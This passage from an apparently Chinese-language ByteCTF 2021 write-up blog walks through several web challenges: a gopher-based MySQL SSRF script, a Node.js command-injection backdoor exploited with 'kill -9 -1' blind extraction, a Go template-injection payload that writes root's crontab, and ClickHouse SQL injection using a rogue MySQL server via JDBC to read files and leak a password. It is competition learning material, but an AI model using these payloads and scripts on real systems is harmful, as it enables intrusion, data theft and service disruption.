length <span class="token operator">=</span> <span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token operator">+</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span>

dump <span class="token operator">=</span> length <span class="token operator">+</span> <span class="token string">"00000185a6ff0100000001210000000000000000000000000000000000000000000000"</span>
dump <span class="token operator">+=</span> encode_user
dump <span class="token operator">+=</span> <span class="token string">"00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"</span>
dump <span class="token operator">+=</span> <span class="token string">"69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"</span>
dump <span class="token operator">+=</span> <span class="token string">"067838365f36340c70726f6772616d5f6e616d65056d7973716c"</span>

auth <span class="token operator">=</span> dump<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token string">"gopher://172.73.23.100:3306/_%"</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        query <span class="token operator">=</span> query<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span>
        query_length <span class="token operator">=</span> <span class="token string">'{:06x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        query_length <span class="token operator">=</span> query_length<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
        pay1 <span class="token operator">=</span> query_length <span class="token operator">+</span> <span class="token string">"0003"</span> <span class="token operator">+</span> query
        final <span class="token operator">=</span> encode<span class="token punctuation">(</span>auth <span class="token operator">+</span> pay1 <span class="token operator">+</span> <span class="token string">"0100000001"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> final
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> encode<span class="token punctuation">(</span>auth<span class="token punctuation">)</span>


url <span class="token operator">=</span> <span class="token string">"http://47.94.152.65:30001/api/ip.php"</span>
<span class="token comment" spellcheck="true"># for i in range(1, 255):</span>
query <span class="token operator">=</span> <span class="token string">"drop function sys_eval;"</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"domain"</span><span class="token punctuation">:</span> get_payload<span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">}</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># print(res.text)</span>
j <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># print(res.text)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="windows下的UDF"><a href="#windows下的UDF" class="headerlink" title="windows下的UDF"></a>windows下的UDF</h3><p>windows下的UDF提权操作可以稍微简单一点，如果目标机器通外网或者内网其他机器有写权限的时候，可以通过<code>\\ip@port\path</code> UNC path，可以用来进行远程访问，直接加载对应文件</p>
<p>在终端上执行的时候需要转义反斜杠，也就是四个斜杠来表示一个UNC路径。简单测试了一下，只有windows下的mysql支持UNC路径进行远程加载（毕竟这个是windows才有的东西），但是我还是非常的愚蠢，我一开始居然会觉得这个UNC路径的加载是使用http协议的。。。后来搜了一下，说是使用的smb和webdav，先默认连接445的smb端口，连不上再去用http连webdav，如果指定了SSL属性就用https，虽然说webdav是http的修改版，但正常的http服务器仍然无法提供webdav服务，所以想提供UNC路径的加载，还需要额外搭服务</p>
<p>这个端口是用@来分隔的，我一开始还在用冒号（但是mysql似乎不支持这个@指定端口，本地测试并未成功，指定端口后wireshark都没看见有流量发出去，以及我怀疑学校有奇怪的策略，我什么都不加就连445端口但会被超级丢包），以及本地测试mysql好像并不会尝试去连webdav？wireshark抓包的结果是只给445还有139端口发送了数据</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权</a><br><a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation/">MySQL UDF Exploitation</a><br><a href="https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/">Understanding UNC paths, SMB, and WebDAV</a></p>
<h2 id="nothing"><a href="#nothing" class="headerlink" title="nothing"></a>nothing</h2><p>nodejs的一些操作，学到了一点东西<br>首先给出源码，这个题理论上来说是需要扫目录扫出源码的。。否则就是这个源码里写的一个<code>Here is a backdoor,can you shell it and get the flag?</code>。。。有点让人无语</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> exec <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exec<span class="token punctuation">;</span>
<span class="token keyword">const</span> src <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">"app.js"</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">'ByteCTF'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Here is a backdoor,can you shell it and get the flag?"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>ByteCTF<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">3000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> byteCTF <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>ByteCTF<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>byteCTF<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"too long."</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> q <span class="token operator">=</span> <span class="token string">"{"</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>ByteCTF <span class="token operator">+</span> <span class="token string">"}"</span>
            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Got it!"</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>backdoor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">exec</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>backdoor<span class="token punctuation">)</span>
                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"exec complete,but nothing here"</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Nothing here!"</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"too short."</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`listening at port 3000`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span> 
</code></pre>
<p>第一层很简单，要求<code>req.query.ByteCTF.length &gt; 3000</code>，同时在被解析成json之后长度小于1024，只要令ByteCTF这个名字有一个属性名字是length，然后值大于3000就行了嘛（所以我印象里好像有的地方有提到，开发时要使用其他方法来判断字符串的长度？）<br>第二层就略微的有些玄幻了，他需要<code>const q = &quot;&#123;&quot; + req.query.ByteCTF + &quot;&#125;&quot;</code>这一句话抛出一个异常，才能进try catch的命令执行，理论上来说，无论这个ByteCTF是什么类型，和字符串进行加都是不会出现异常的，并且我们这顶多也就是让ByteCTF是一个字典（还是对象？）</p>
<p>这一步就比较的tricky，反正ByteCTF不会是一个字符串，那非字符串和字符串拼接需要隐式调用toString，因此可以把ByteCTF的toString属性也赋一个值，变成一个字符串，这样子和字符串做加法的时候toString不是函数，调用起来原地爆炸，就能进catch了</p>
<p>第三步也很tricky，因为exec是另开进程进行执行的，且是异步非阻塞的，而回显也不存在，简单试了下感觉机器也不出网，反弹shell也不行。想办法盲注，但是盲注随你输什么，反正没有任何的反应，得到的结果永远是他写死的内容</p>
<p>然后开始想歪门邪道，一开始想的是fork炸弹，丢了几个进去毫无反应，连卡顿都没有出现，然后想起了rmb神仙以前教我的杀全部进程之术<code>kill -9 -1</code>，以前是用来杀究极内存马的，因为本身执行命令的用户权限低于主服务的权限，所以杀全部进程也只是把服务进程杀掉，守护进程会重新拉起新的服务进程。一打就通，直接connect reset，拿到回显点了</p>
<p>然后简单的研究了一下bash的if语句结果，先手打测出来了部分flag名字，写了个破烂脚本盲注</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

charset <span class="token operator">=</span> <span class="token string">"1234567890abcdef"</span>
url <span class="token operator">=</span> <span class="token string">"http://39.106.34.228:30001/?ByteCTF[length]=3001&amp;ByteCTF[toString]=aaa&amp;backdoor="</span>
flag <span class="token operator">=</span> <span class="token string">"ByteCTF{"</span>
cmd <span class="token operator">=</span> <span class="token string">"if cat /*f1a*|grep {};then kill -9 -1;fi"</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        send <span class="token operator">=</span> url <span class="token operator">+</span> cmd<span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>i<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(send)</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>send<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
                flag <span class="token operator">+=</span> i
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
</code></pre>
<p>至于这里重复五遍，是手试的时候发现服务有时候不会百分百崩溃，但总体效果是对的，重复几次以防万一</p>
<p>以及rmb说他们的做法是pkill，通过进程名批量杀进程，感觉差不多，不过他说他们的做法打出来是502，就不需要我这一步try except</p>
<h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>golang的SSTI，但是我完全不会go，所以还临时学习了个把小时的go基础语法</p>
<h3 id="go基本语法"><a href="#go基本语法" class="headerlink" title="go基本语法"></a>go基本语法</h3><p>go最为反人类的一点就是他和其他编程语言相反，是变量名在前，变量类型在后的，比如声明一个字符串a，go里面就得写成<code>var a string</code>，虽说可以隐式的<code>var a = &quot;string&quot;</code>声明变量，或者高级语法糖<code>a := &quot;string&quot;</code>，但在函数声明之类的地方还是显得异常折磨。。。<br>比如这个</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>context<span class="token punctuation">)</span> <span class="token function">File</span><span class="token punctuation">(</span>file <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>err <span class="token builtin">error</span><span class="token punctuation">)</span>
</code></pre>
<p>这个函数名为File，接收一个类型为string的参数file，返回值是名为err的error类型对象。那么，函数名前面的这个<code>(c *context)</code>又是个啥？<br>再学一下，golang没有类这个操作，都是由结构体进行数据类型的封装，那结构体不像类一样有函数啊，那咋搞呢，就用函数名前面这么个括号，来修饰这个函数的调用者是什么类型（好像官方说法叫接收者），在我看来就是把这个函数声明成对应结构体的成员函数了，因为只有这个结构体的对象才能调用这个方法嘛，也算是间接实现了类。。。<br>因此，<code>(c *context)</code>表示这个函数需要被一个context结构体对象调用，这里的c就相当于c++之类的语言里面的this，而星号可以理解为传引用，可以直接通过c修改调用者的属性，没有星号就是传值，函数内修改不影响调用者的值</p>
<p>还有一点，go没有成员修饰符，也就是说没有public，private之类的功能，但是和java一样有package，package内的函数，可以访问该package中的任意变量和方法，而若是引用另一个package中的内容，则只有开头是大写字母的方法和变量能够被获取到，简单的理解就是首字符是大写字母public，首字符非大写字母private</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>目标站点就两个功能，登录注册和查看log，log有用户名ip，ua之类的数据，打这里的模板注入（不过要能试出来这里是个go。。。要是我的话肯定第一反应是nodejs或者python之类的，不过也据说给了dockerfile？反正我看不到）<br>go的模板库有text&#x2F;template和html&#x2F;template两个，既然这里是web相关的，先默认他是html的这个库，而go的模板渲染与python，nodejs的都不一样，他只允许传入一个对象，然后使用该对象下面的成员进行模板渲染，不能像node或者python传入多个变量一一渲染<br>也由于这个原因，go的ssti危害性应当小于python和node的，因为<strong>只允许访问传入对象下的属性和方法</strong>，如果单纯的只是模板可控，而传入的对象本身无危险方法的话，可能就只能打个xss玩了<br>那么这里传入的对象是，gin下的context对象，gin是go中最常用的web框架，就像nodejs中的express，koa一样，context是会话上下文，里面有完整的request和response对象，以及一堆方法。包括了处理文件上传的方法</p>
<pre class=" language-golang"><code class="language-golang">FormFile(name string) (*multipart.FileHeader, error)
MultipartForm() (*multipart.Form, error)
SaveUploadedFile(file *multipart.FileHeader, dst string) error
</code></pre>
<p>当然，go是究极编译语言，并不吃什么文件上传rce，因此是通过文件上传写root的crontab实现rce（据说也是dockerfile里写的，root启动的go+能写root的crontab &#x3D;&#x3D;&#x3D; 随意搅屎）<br>抄一个样例payload</p>
<pre><code>{{ $a := .FormFile "file" }} {{ .SaveUploadedFile $a "/var/spool/cron/crontabs/root" }}
</code></pre>
<p>访问触发点的同时上传恶意文件即可</p>
<p>模板中函数调用也不需要加括号，参数就直接按顺序放在后面就行<br>点号直接就是访问传入对象的属性，或者说，可以理解为再点号前面自动补全了一个this<br>这里有一个点稍微需要注意一下，<strong>不能调用没有返回值的函数</strong>，并且调用了没有返回值的函数会导致从这里开始后续的模板全部不被处理（本地测试的结果）<br>看了上交一个师傅写的wp，他提到调用的函数只允许有一个返回值，或两个返回值且第二个返回值是error类型</p>
<p>至于怎么测试出来给的是gin的Context呢，简单翻了下文档没看见什么好用的，直接百度Context对象里有啥，然后找到了<code>Request.URL.Query()</code>这个方法，获取到所有的get参数，直接<code>{{.Request.URL.Query}}</code>渲染，就可以在渲染界面看到自己提交的get参数，算是验证了对象是context（这里Request虽然大写但实际上是一个对象名。。。因为前面提到的大写的对象名才被认为是公有的），也可以直接<code>{{.}}</code>之类的，配合模板语法还能range之类的遍历一下<br><code>{{range .Keys}}{{printf "%#q" .}}{{end}}</code>说是这个可以导出一些小写开头的变量？</p>
<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://pkg.go.dev/html/template">pkg html&#x2F;template</a><br><a href="https://www.onsecurity.io/blog/go-ssti-method-research/">go ssti method research</a><br><a href="https://www.kancloud.cn/liuqing_will/the_source_code_analysis_of_gin/616921">Context结构体</a><br><a href="https://www.imwxz.com/crack_ctf/223.html">ByteCTF 2021 babyweb摸鱼wp</a></p>
<h2 id="bytehouse"><a href="#bytehouse" class="headerlink" title="bytehouse"></a>bytehouse</h2><p>SQL注入，但是是 clickhouse这个奇怪的数据库，好像以前再哪场比赛上遇到过，但实在是不熟（搜了一下发现是字节初赛。。。并且那个题有点脑溢血）。题目很贴心，随你输什么，不仅没有过滤，还把报错返回给你，随便按两下就能看到 clickhouse这个独具一格的报错，也就能推测出数据库的类型了</p>
<p>并且乱按的话还会输出查询语句，是用jdbc连的远程数据库，应该是指连接的mysql-server1的bytectf库下的users表<br><code>SELECT name FROM jdbc(&#39;jdbc:mysql://mysql-server1?password=root&#39;, &#39;bytectf&#39;, &#39;users&#39;) WHERE id = a</code></p>
<p>也没有引号包裹什么的，随便打，先来一波union注入。 clickhouse的union注入语法为<code>union all select</code>，不过 clickhouse的数据类型判断好像比较强，有点像那个postgresql？一般来说用报错外带的方式来注数据</p>
<p>直接<code>union all select * from system.columns</code>就会报错列不匹配，顺便会把整个库的所有列个展示出来（好人啊）</p>
<p>这个数据库，太奇怪了一点。。。字符串拼接什么的也很麻烦，并且这里还配置了奇怪的内存限制，我从网上找资料拼出来了一个查全部数据库的payload，然后报错说预计使用的内存超出了限制，不给查，然后就只能写脚本反复跑了，运气好总有一次低于内存限制</p>
<h3 id="基础注入语句"><a href="#基础注入语句" class="headerlink" title="基础注入语句"></a>基础注入语句</h3><pre><code>0 union all select arrayStringConcat((select groupUniqArray(name) FROM system.databases),&#39;,&#39;)

INFORMATION_SCHEMA,bytectf,system,information_schema,default
</code></pre>
<p>arrayStringConcat的功能类似于mysql的group_concat，把查询结果拼成字符串，还可以插入分隔符，但查询结果本身是多行的话并不能用，而groupUniqArray就是把不重复的结果拼成一个array，两个函数组合起来才可用把多行查询结果变成一个字符串返回</p>
<p>查一下bytectf这个库有啥</p>
<pre><code>0+union+all+select+arrayStringConcat((select+groupUniqArray(name)+FROM+system.tables+where+database=&#39;bytectf&#39;),&#39;,&#39;)

user
</code></pre>
<p>就一个user表<br>同理查列，也没什么数据</p>
<pre><code>0+union+all+select+arrayStringConcat((select+groupUniqArray(name)+FROM+system.columns+where+table=&#39;user&#39;),&#39;,&#39;)

id,user
</code></pre>
<p>查数据</p>
<pre><code>&quot;0 union all select arrayStringConcat((select groupUniqArray(name) FROM bytectf.user),&#39;,&#39;)

user2,user1,user3
</code></pre>
<p>好像和直接输入id的话结果不一样，因为直接输id只有user1&#x2F;2，而这里多出来一个，感觉应该是这里的bytectf是本地的数据库，而之前的数据库是通过jdbc连接的远程数据库，远程数据库是bytectf.users，只有两个数据</p>
<p>但这些数据都没什么用，尝试读文件，但超级报错</p>
<pre><code>0 union all SELECT c FROM file(&#39;/proc/self/cmdline&#39;, &#39;CSV&#39;, &#39;c String&#39;)

 File `/proc/self/cmdline` is not inside `/var/lib/clickhouse/user_files`
</code></pre>
<p>看来非常的安全，有文件读路径的限制，似乎另一个利用就是用url函数ssrf发请求了。但暂时没东西可以打</p>
<h3 id="rouge-mysql-server"><a href="#rouge-mysql-server" class="headerlink" title="rouge mysql server"></a>rouge mysql server</h3><p>我又忘了这一点。。。虽然我们交互的数据库是 clickhouse，但是他可以用jdbc去连接mysql，发起任意可控的mysql连接约等于任意文件读。。。<br>用GitHub上的经典rouge mysql server，python2启动</p>
<pre><code>0 union all SELECT a from jdbc(&#39;jdbc:mysql://www.z3ratu1.cn:10012&#39;,&#39;test&#39;,&#39;test&#39;)

Server asked for stream in response to &quot;LOAD DATA LOCAL INFILE&quot; but functionality is not enabled at client by setting &quot;allowLoadLocalInfile=true&quot; or specifying a path with &#39;allowLoadLocalInfileInPath&#39;.
</code></pre>
<p>超级报错，我一开始还以为是客户端关了这个操作，一搜发现，居然可以直接在url里加这个参数来开启，这个报错的意思也是直接在url参数里加就可以启用。。。<br>之后还有一个<code>max_allowed_packet</code>的类似问题，都可以通过改参数的方式解决<br>如下payload实现任意文件读</p>
<pre><code>0 union all SELECT a from jdbc(&#39;jdbc:mysql://www.z3ratu1.cn:10012?useSSL=false&amp;allowLoadLocalInfile=true&amp;maxAllowedPacket=10000000&#39;,&#39;test&#39;,&#39;test&#39;)
</code></pre>
<p><a href="https://www.freebuf.com/articles/web/251626.html">JDBC MySQL任意文件读取中的一些坑</a></p>
<p>先读&#x2F;etc&#x2F;hosts看看有哪些机器，读到一个<code>172.18.0.5 jdbc-bridge</code>（怎么感觉就是自己）</p>
<p>读&#x2F;proc&#x2F;self&#x2F;cmdline，读出来了一堆我看不懂的东西</p>
<pre><code>java -XX:+UseContainerSupport -XX:+IdleTuningCompactOnIdle -XX:+IdleTuningGcOnIdle -Xdump:none -Xdump:tool:events=systhrow+throw,filter=*OutOfMemoryError,exec=kill -9 %pid -Dlog4j.configuration=file:////app/log4j.properties -Dnashorn.args=--language=es6 -jar clickhouse-jdbc-bridge-shaded.jar
</code></pre>
<p>加了一堆buff，最后是用的clickhouse-jdbc-bridge-shaded.jar</p>
<p>看了看简介，好像就是一个clickhouse再集成一个jdbc，可以连各种其他的数据库，官方还有docker，可以搞一个docker运行一下（我没有下了。。）<br>理论上开了docker之后可以看到一个路径<code>/app/logs/console.log</code>，读日志（从wp中直接获取的思路）</p>
<h3 id="rouge-mysql超级踩坑"><a href="#rouge-mysql超级踩坑" class="headerlink" title="rouge mysql超级踩坑"></a>rouge mysql超级踩坑</h3><p>我直接尝试下这个日志然后发现卡了半天没反应。。。感觉会不会是日志太大了下不下来了？以及他这个jdbc好像也是同步的？我把上一个下log的请求卡住之后，后续的所有请求都卡住了。。只有关掉rouge mysql server断开连接才恢复正常</p>
<p>然后把网上常见的几个rouge mysql server都下下来试了一遍，一个能打的都没有，都不能下载大文件，最常用的那个会卡住。<br>然后fnmsd神仙的那个看起来比较完善，GitHub上介绍是说50M文件都随便下，但实际使用时会报一个<code>45 is not a valid CharacterSet</code>的问题（去issue里看了一眼说是因为java connect版本太高，已经修了，可能这次的版本更高了，又不能用了。。。），剩下的零零散散的实现也都不能用</p>
<p>最后我直接下rmb神仙自己写的<br><a href="https://github.com/rmb122/rogue_mysql_server">rmb122&#x2F;rogue_mysql_server</a><br>唯一缺点是用go写的，还没编译出来，完全不会用。。。windows上虽然有Goland，但是编译的时候报错config.yaml找不到，并且报错的路径还是在一个temp目录下，在完全没有理解golang编译过程的情况下，我直接转移平台到Linux上（虽说昨天已经基础入门了golang语法，但是这并不意味着我能编译出来一个go的二进制程序）</p>
<h3 id="读log"><a href="#读log" class="headerlink" title="读log"></a>读log</h3><p>显然这里是出题人一开始就设置好了的，在环境启动时连接了mysql-server2并查询了一个不存在的数据库，导致报错，而这样子就在日志文件中保留下来了连接server2时的密码</p>
<pre><code>java.lang.IllegalStateException: Failed to infer schema from [jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7] due to: Failed to access [jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7] due to: Unknown database &#39;not_found_db&#39;
</code></pre>
<p>连上的虽然是mysql的server，但是查询语句还是得按clickhouse的规则来。。。不过比较贴心的是会报错，这样子就能很快的看到有哪些列之类的（这里列名必须大写，怪）</p>
<pre><code>0 union all select * from jdbc(&#39;jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7&#39;, &#39;information_schema&#39;, &#39;schemata&#39;)

code: 258, message: Different number of columns in UNION ALL elements:
name
and
CATALOG_NAME, SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME, DEFAULT_COLLATION_NAME, SQL_PATH, DEFAULT_ENCRYPTION
</code></pre>
<p>可以limit x,x+1一个个查，或者套一层之前的这个查询方法</p>
<pre><code>0 union all select arrayStringConcat((select groupArray(SCHEMA_NAME) from jdbc(&#39;jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7&#39;, &#39;information_schema&#39;, &#39;schemata&#39;)),&#39;,&#39;)

mysql,information_schema,performance_schema,sys,bytectf
</code></pre>
<pre><code>0 union all select arrayStringConcat((select groupArray(TABLE_NAME) from jdbc(&#39;jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7&#39;, &#39;information_schema&#39;, &#39;tables&#39;) where TABLE_SCHEMA=&#39;bytectf&#39;),&#39;,&#39;)

flag
</code></pre>
<p>列名也是flag，最后查flag值</p>
<pre><code>0 union all select arrayStringConcat((select groupArray(flag) from jdbc(&#39;jdbc:mysql://mysql-server2?password=ae260407425a4b4d708c42e07c292ee7&#39;, &#39;bytectf&#39;, &#39;flag&#39;)),&#39;,&#39;)

bytectf&#123;JD6C_inj3ct_i5_funny&#125;
</code></pre>
<h4 id="golang安装编译入门"><a href="#golang安装编译入门" class="headerlink" title="golang安装编译入门"></a>golang安装编译入门</h4><p>编译rmb写的工具时遇到的各种问题<br>碎碎念拉满</p>
<p>首先明确一点，**go的版本要不小于1.13!!!**，版本到了解决99%问题（为什么Ubuntu自带的是1.6这种究极远古版本），网上有很多安装的方法，但大多是手动下载并解压，新时代人类无法接受这种原始的方法，于是我直接寻找apt安装方法</p>
<pre class=" language-bash"><code class="language-bash">add-apt-repository ppa:longsleep/golang-backports
<span class="token function">apt-get</span> update
<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> golang-go
</code></pre>
<p>能装一个1.13，虽然不是最新，但也达到基本要求了</p>
<p>至于为什么要装1.13，其中有很多缘由。首先是golang有一系列的环境变量，这里着重讨论GOPATH，GOPATH之下主要包含三个目录: bin、pkg、src。bin是编译出来的二进制文件，pkg放第三方库，而src放项目源代码<br>如果你有多个项目，那么你应该在<code>GOPATH/src/</code>下分别建立多个项目文件夹。虽然也许这符合一定的规范，但我觉得项目都得位于某个固定位置下的设计非常愚蠢</p>
